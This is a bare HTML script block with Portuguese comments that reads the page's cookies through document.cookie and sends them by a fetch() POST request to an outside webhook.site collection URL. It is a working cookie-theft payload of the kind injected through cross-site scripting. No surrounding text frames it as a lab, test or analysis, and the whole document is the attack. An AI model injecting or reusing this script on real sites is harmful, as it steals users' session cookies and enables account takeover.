<script>
    // Obter todos os cookies da página
    var cookies = document.cookie;

    // Definir o URL do webhook
    var webhookUrl = 'https://webhook.site/2dfcc623-5c60-4ed9-84c7-f2efae2af582';

    // Criar o corpo da requisição
    var requestBody = JSON.stringify({ cookies: cookies });

    // Enviar os cookies para o webhook
    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: requestBody,
    })
    .then(response => {
        // Verificar se a requisição foi bem-sucedida
        if (response.ok) {
            console.log('Cookies enviados com sucesso!');
        } else {
            console.log('Falha ao enviar cookies.');
        }
    })
    .catch(error => {
        // Tratar qualquer erro que ocorra durante a requisição
        console.error('Erro:', error);
    });
</script>
